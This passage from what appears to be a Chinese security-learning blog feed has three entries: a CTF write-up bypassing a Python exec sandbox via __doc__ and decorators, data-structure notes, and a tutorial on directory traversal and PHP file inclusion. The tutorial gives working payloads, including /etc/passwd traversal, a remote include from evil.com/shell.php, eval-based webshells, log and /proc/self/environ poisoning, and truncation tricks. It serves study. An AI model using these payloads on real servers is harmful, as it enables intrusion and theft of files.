class="headerlink" title="Python沙盒绕过"></a>Python沙盒绕过</h2><p>关键在于学python，而8是学姿势，因为姿势太多了…..</p><p>题目的话，是要给1个QQ_bot发送payload以获取flag，因为时隔已久，所以也没保存截图啥的</p><p>有个附件，里面是代码，当时心态大崩所以连打开康康的勇气都没了…<br>事实上这个决定也没戳，看了大佬的wp后，这道题要想有个思路啥的至少得有150点Python精通，像什么__doc__之类的我一个写爬虫的屑辣鸡压根没听过….(虽然如此，但绕过的方法应该8止这一种)</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>下载附件，是python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>code = sys.argv[<span class="hljs-number">1</span>]  <span class="hljs-comment">#即给程序的第一个参数</span><br><span class="hljs-keyword">try</span>:<br>    data = b64decode(code.encode()).decode()   <span class="hljs-comment">#code.encode(): 把code转化为字节码; 然后base64解码，然后再返回去</span><br><span class="hljs-keyword">except</span>:      <span class="hljs-comment"># 若触发异常的解决方案</span><br>    exit(<span class="hljs-number">0</span>)   <span class="hljs-comment">#那就是退出辣</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;h&quot;\&#x27;(&#x27;</span>:  <span class="hljs-comment"># 屏蔽一些字符   </span><br>    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> data: exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">exec</span>(data)  <span class="hljs-comment"># 执行命令(在python环境下)</span><br><br></code></pre></td></tr></table></figure><p>思路: 写在理解后<br>首先，输入字符串，被base64解码，再被屏蔽掉 h “ ‘ \ ( 这些字符，然后进行exec</p><p>那么就阔以通过利用差8多exec(“os.system(‘xxx’)”)的形式进行操作, 但是里面的单引号和xxx怎么绕过呢?<br>阔以通过先构造1个字符串a，然后以exec(“os.system(a)”)的形式操作。但是构造字符串还是需要单引号啊<br>这里就有8止一种绕过方法了，wp是通过__doc__来绕过单引号，暂时也想不出别的方法能绕过呜呜呜<br>怎么通过__doc__绕过呢? 阔以看后面的扫盲</p><p>然后这个问题也就解决了，就阔以构造payload了<br>那么就又又问题了，屏蔽了括号，怎么绕过?</p><p>然后看的wp里构造payload需要了解 函数装饰器，这个也咩听过,后来学的,在有关python的博客文章里做笔记了，这里就掠过</p><p>然后，接下来应该由你自己实现构造了，骚年!!!</p><p>可是….构造装饰函数时也需要用到括号啊…….莫非有什么👴8知道的姿势?</p><p>payload: 比方我要输入命令ls:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>a=&#123;&#125;.__doc__<br>cmd=a[<span class="hljs-number">69</span>] + a[<span class="hljs-number">97</span>] <span class="hljs-comment"># ls</span><br>x=<span class="hljs-keyword">lambda</span> _:cmd   <span class="hljs-comment">#匿名函数x返回结果为cmd, 即&#x27;ls&#x27;</span><br><span class="hljs-meta">@os.system     </span><span class="hljs-comment"># 第一层修饰</span><br><span class="hljs-meta">@x            </span><span class="hljs-comment"># 第二层修饰</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">_</span>: <span class="hljs-keyword">pass</span>  <span class="hljs-comment">#装饰器修饰的对象工具人，至于这里的class是什么意思....8知道了，网上没搜到，可能与类的声明有关(可这明明是函数啊)</span><br><span class="hljs-comment"># 就相当于:     先执行class=x(class),结果是增加了返回&#x27;ls&#x27;的语句， 然后是class=os.system(class)</span><br></code></pre></td></tr></table></figure><h3 id="扫盲"><a href="#扫盲" class="headerlink" title="扫盲"></a>扫盲</h3><h4 id="doc"><a href="#doc" class="headerlink" title="doc"></a><strong>doc</strong></h4><p>是个说明文档，用来帮助py使用者们理解的功能，eg: 略</p><p>他还有个功能就是这个:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a=&#123;&#125;.__doc__<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">350</span>,<span class="hljs-number">350</span>):<br>    <span class="hljs-built_in">print</span>(a[i])<br></code></pre></td></tr></table></figure><p>结果(去掉换行符)是一句话: </p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">dictionarydict(mapping)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedfromamappingobject</span>&#x27;s(key,value)pairsdict(iterable)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedasifvia</span>:d=&#123;&#125;fork,viniterable:<span class="hljs-type">d</span>[k]=vdict(**kwargs)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedwiththename</span>=valuepairsinthekeywordargumentlist.Forexample:<span class="hljs-type">dict</span>(one=<span class="hljs-number">1</span>,two=<span class="hljs-number">2</span>)dict()-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">emptydictionarydict</span>(mapping)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedfromamappingobject</span>&#x27;s(key,value)pairsdict(iterable)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedasifvia</span>:d=&#123;&#125;fork,viniterable:<span class="hljs-type">d</span>[k]=vdict(**kwargs)-&gt;<span class="hljs-keyword">new</span><span class="hljs-type">dictionaryinitializedwiththename</span>=valuepairsinthekeywordargumentlist.Forexample:<span class="hljs-type"></span><br></code></pre></td></tr></table></figure><p>这句话是啥意思8要紧，但是里面有26个英文字母，阔以帮助俺们绕过，eg: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a=&#123;&#125;.__doc__<br>a[-<span class="hljs-number">348</span>]+a[-<span class="hljs-number">343</span>]+a[<span class="hljs-number">334</span>]+a[<span class="hljs-number">336</span>]+a[<span class="hljs-number">75</span>]+a[<span class="hljs-number">69</span>]+a[-<span class="hljs-number">343</span>]+a[<span class="hljs-number">42</span>]  <span class="hljs-comment">#就是字符串&#x27;cat flag&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>赛事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>赛事</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构笔记??</title>
    <link href="/2021/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="stdarg-h"><a href="#stdarg-h" class="headerlink" title="stdarg.h"></a>stdarg.h</h1><h2 id="void-va-start-va-list-ap-last-arg"><a href="#void-va-start-va-list-ap-last-arg" class="headerlink" title="void va_start(va_list ap, last_arg)"></a>void va_start(va_list ap, last_arg)</h2><p>这个宏初始化 ap 变量，它与 va_arg 和 va_end 宏是一起使用的。last_arg 是最后一个传递给函数的已知的固定参数，即省略号之前的参数</p><h2 id="type-va-arg-va-list-ap-type"><a href="#type-va-arg-va-list-ap-type" class="headerlink" title="type va_arg(va_list ap, type)"></a>type va_arg(va_list ap, type)</h2><p>这个宏检索函数参数列表中类型为 type 的下一个参数</p><h2 id="void-va-end-va-list-ap"><a href="#void-va-end-va-list-ap" class="headerlink" title="void va_end(va_list ap)"></a>void va_end(va_list ap)</h2><p>这个宏允许使用了 va_start 宏的带有可变参数的函数返回。如果在从函数返回之前没有调用 va_end，则结果为未定义</p><h1 id="union"><a href="#union" class="headerlink" title="union"></a>union</h1><p>略，注意其大小由最大的组成部分决定</p><h1 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h1><p>typedef enum{<br> Atom,List<br>}ElemTag;<br>typedef struct GLNode{<br>    ElemTag tag;<br>    union{<br>        AtomType atom;<br>        struct GLNode *hp;<br>    };<br>    struct GLNode *tp;<br>}*GList;</p><h1 id="先、中、后序遍历"><a href="#先、中、后序遍历" class="headerlink" title="先、中、后序遍历"></a>先、中、后序遍历</h1><p>先序：考察到一个节点后，即刻输出该节点的值，并继续遍历其左右子树。(根左右)</p><p>中序：考察到一个节点后，将其暂存，遍历完左子树后，再输出该节点的值，然后遍历右子树。(左根右)</p><p>后序：考察到一个节点后，将其暂存，遍历完左右子树后，再输出该节点的值。(左右根)</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目录穿越&amp;文件包含漏洞</title>
    <link href="/2021/11/19/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/11/19/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>原理很简单的漏洞吧，主要就是各种绕过+组合</p><!-- about --><h1 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h1><p>eg:<br><a href="https://www.*****.com/loadImage?filename=../../../etc/passwd">https://www.*****.com/loadImage?filename=../../../etc/passwd</a><br>filename的参数值与真实路径组合起来就是：<br>&#x2F;var&#x2F;www&#x2F;images&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>其等价于：<br>&#x2F;etc&#x2F;passwd<br>..&#x2F;：上一级目录；.&#x2F;：当前目录；&#x2F;：根目录</p><h2 id="可能出现的情况"><a href="#可能出现的情况" class="headerlink" title="可能出现的情况"></a>可能出现的情况</h2><p>比如前端是这么写的: </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/loadImage?filename=214.png&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><h3 id="绝对路径绕过"><a href="#绝对路径绕过" class="headerlink" title="绝对路径绕过"></a>绝对路径绕过</h3><p>web网站有时候会采取目录遍历的防御措施，如过滤 ..&#x2F; 上一级等关键字，可以试试绝对路径绕过，无须..&#x2F;返回上一级目录遍历：filename&#x3D;&#x2F;etc&#x2F;passwd<br>至于&#x2F;etc&#x2F;passwd，是linux常见目录…</p><h3 id="双写-绕过"><a href="#双写-绕过" class="headerlink" title="双写..&#x2F;绕过"></a>双写..&#x2F;绕过</h3><p>若防御措施是把关键词替换为空(我觉得这种概率很小)，可以采用双写绕过</p><h3 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h3><p>.   &#x3D;&gt;  %2e<br>&#x2F;   &#x3D;&gt;  %2f<br>% &#x3D;&gt; %25  (双重URL编码)</p><h3 id="nginx绕过"><a href="#nginx绕过" class="headerlink" title="nginx绕过"></a>nginx绕过</h3><p>参考链接: <a href="https://blog.csdn.net/weixin_42586723/article/details/122944781">https://blog.csdn.net/weixin_42586723&#x2F;article&#x2F;details&#x2F;122944781</a><br>大概: Nginx在nginx.conf文件配置别名(Alias)的时候，如果忘记加&#x2F;，将造成一个目录穿越漏洞<br>eg: </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/files../</span><br></code></pre></td></tr></table></figure><p>原理: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /files &#123;<br>    autoindex on;<br>    <span class="hljs-built_in">alias</span> /home/;<br>&#125;<br>会造成目录穿越，应把/files改成/fiels/<br>(我有个问题昂，就是如果改成/files/，那我payload就8能换成https://example.com/files/../ 吗)<br></code></pre></td></tr></table></figure><h3 id="UNC绕过"><a href="#UNC绕过" class="headerlink" title="UNC绕过"></a>UNC绕过</h3><p>payload: </p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\\localhost\c$\windows\win.ini<br></code></pre></td></tr></table></figure><p>UNC(Universal Naming Convention): 通用命名规则<br>C:\WINDOWS\Win.ini: 该文件为重要的系统文件。默认保存在C:\Windows\win.ini(相同目录下还有system.ini)，里面的内容大概长这样:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; for 16-bit app support</span><br><span class="hljs-section">[fonts]</span><br><span class="hljs-section">[extensions]</span><br><span class="hljs-section">[mci extensions]</span><br><span class="hljs-section">[files]</span><br><span class="hljs-section">[Mail]</span><br><span class="hljs-attr">MAPI</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>由于语言特性，该漏洞在php里居多，在jsp、asp里很少，所以主要讨论php里的<br>举个常见的文件包含漏洞的形式: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;inc/&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过这个漏洞，可以执行或显示php代码，为此可以与文件上传、文件写入等漏洞配合</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>PHP中的文件包含分为本地文件包含和远程文件包含</p><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>本地文件包含 Local File Include (LFI)<br>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。<br>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p><h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>远程文件包含 Remote File Include (RFI)<br>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include&#x3D;off），开启远程包含功能需要在php.ini配置文件中修改。<br>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，但是一般遇8到…</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">如果支持远程文件包含，那么直接<span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9999</span>/index.php?<span class="hljs-built_in">file</span>=<span class="hljs-keyword">http</span>://evil.com/<span class="hljs-built_in">shell</span>.php 即可<span class="hljs-built_in">get</span> <span class="hljs-built_in">shell</span><br></code></pre></td></tr></table></figure><h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><p>4个<br>include：找不到被包含的文件时只会产生警告，脚本将继续执行。<br>include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require：找不到被包含的文件时会产生致命错误，并停止脚本。<br>require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</p><h2 id="使用php封装协议读取"><a href="#使用php封装协议读取" class="headerlink" title="使用php封装协议读取"></a>使用php封装协议读取</h2><p>正常情况下，包含php文件只会执行其中的代码，但如果我们想获取到php文件的源码，如config.php，那么我们可以通过封装协议php:&#x2F;&#x2F;filter来读取<br><a href="http://localhost/index.php?file=php://filter/read=convert.base64-encode/resource=shell.png">http://localhost/index.php?file=php://filter/read=convert.base64-encode/resource=shell.png</a></p><p>php:&#x2F;&#x2F;input<br>利用条件: 需要开启allow_url_include&#x3D;on，对allow_url_fopen不做要求<br>大概就是Get传参时写?file&#x3D;php:&#x2F;&#x2F;input<br>然后用Post传参(或者直接改包)，像这样:<br><img src="/images/note/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1.png"></p><p>data伪协议读取文件，要求 allow_url_include&#x3D;On: </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain;base64,c2gxdC5waHA=</span><br><span class="language-xml">?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="LFI-文件上传getshell"><a href="#LFI-文件上传getshell" class="headerlink" title="LFI+文件上传getshell"></a>LFI+文件上传getshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">先文件上传<span class="hljs-number">1</span>个木马如: <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>然后进行利用: <br>http:<span class="hljs-comment">//localhost/index.php?file=shell.png&amp;shell=phpinfo();</span><br>这里我有个问题: 既然都上传了，那为啥不直接用蚁剑连呢? <br></code></pre></td></tr></table></figure><h2 id="LFI-日志注入getshell"><a href="#LFI-日志注入getshell" class="headerlink" title="LFI+日志注入getshell"></a>LFI+日志注入getshell</h2><p>日志文件往往会包含我们的请求记录，如果我们知道日志的文件位置，就可以将恶意的php代码写入到日志中，然后再通过文件包含漏洞执行相关的代码</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">实际操作起来简单的8可思议，比如访问 http://localhost/index.php?file=shell.png&amp;test=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> </span><br><span class="language-xml">然后它就会被记录到日志文件，然后我们只要包含这个日志文件，就可以执行代码了.....(8会出现语法错误什么的吗...)</span><br></code></pre></td></tr></table></figure><p>日志默认路径:<br>tomcat: &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;logs&#x2F;localhost_access_log.2020-09-21.txt<br>apache+linux: &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log<br>nginx: &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;access.log</p><h2 id="LFI-proc-self-environ-getshell"><a href="#LFI-proc-self-environ-getshell" class="headerlink" title="LFI+&#x2F;proc&#x2F;self&#x2F;environ getshell"></a>LFI+&#x2F;proc&#x2F;self&#x2F;environ getshell</h2><p>在linux中，如果php以cgi方式运行(啥是cgi捏，建议学好网络通信基础)，那么&#x2F;proc&#x2F;self&#x2F;environ目录中会包含请求头中的UA(User-Agent)信息，那么这个User-Agent自然可以是木马啦，然后就能getshell了(我次奥，这么随意的吗)<br>具体操作: 抓包，改包:<br>GET lfi.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;environ HTTP&#x2F;1.1<br>User-Agent: <?php phpinfo();?><br>比如上述信息在发送后就可以显示phpinfo，次奥….</p><h2 id="LFI-Session-getshell"><a href="#LFI-Session-getshell" class="headerlink" title="LFI+Session getshell"></a>LFI+Session getshell</h2><p>首先，通过phpinfo()可以知道session的目录<br>如果没法phpinfo也可以猜一猜…<br>常见session存放目录:<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</p><p>向session传入恶意代码的方式有这些:<br>.<br>.<br>.<br>有个P! 还得是php源码里写了类似下面的东西，session才能被你控制，可谓是非常的鸡肋…..</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$cmdback</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmdback&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;hack&quot;</span>]=<span class="hljs-variable">$cmdback</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="后缀限制-截断绕过"><a href="#后缀限制-截断绕过" class="headerlink" title="后缀限制-截断绕过"></a>后缀限制-截断绕过</h2><h3 id="常规截断"><a href="#常规截断" class="headerlink" title="常规截断"></a>常规截断</h3><p>要求:<br>php版本小于5.3.4<br>magic_quotes_gpc为off状态</p><p>若限制了后缀名，则需要通过截断访问: index.php?file&#x3D;..&#x2F;..&#x2F;flag.php%00<br>%00 会被解析为0x00，导致截断的发生</p><h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>文件路径是有最大长度限制的，为此可以通过填充垃圾字符来截断最后一部分<br>比如magic_quotes_gpc为on状态时，会把%00前加\转义掉: flag.php\0<br>条件:<br>php版本小于5.3.4</p><p>windows 259个bytes<br>linux 4096个bytes</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">比如win下: <br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag.php..............................................................................................................................................................................................................................................<br>或者: <br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag.php.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>./<br><span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>flag1.php<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span><br>(文件长度偶数时用<span class="hljs-number">2</span>，奇数时用<span class="hljs-number">3</span>，自己慢慢悟吧...)<br></code></pre></td></tr></table></figure><p>使用截断的时候根据具体情况使用不同截断方法，遇到奇偶问题的时候可以丢一串很长的.&#x2F;到URL后面然后再调整第一个字符。一般来说%00就足够了，当%00不行时再尝试.&#x2F;的组合</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="include-ACTF2020"><a href="#include-ACTF2020" class="headerlink" title="include ACTF2020"></a>include ACTF2020</h3><p>进入页面发现只有一个按钮，点击后发现是这样传播: <a href="http://c9a0e041-1a9e-420b-b1f9-8eba8ff3a35b.node4.buuoj.cn:81/?file=flag.php">http://c9a0e041-1a9e-420b-b1f9-8eba8ff3a35b.node4.buuoj.cn:81/?file=flag.php</a></p><p>于是联想到文件包含漏洞，构造: &#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br>有回显，base64转码得index.php源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;meta charset=<span class="hljs-string">&quot;utf8&quot;</span>&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span 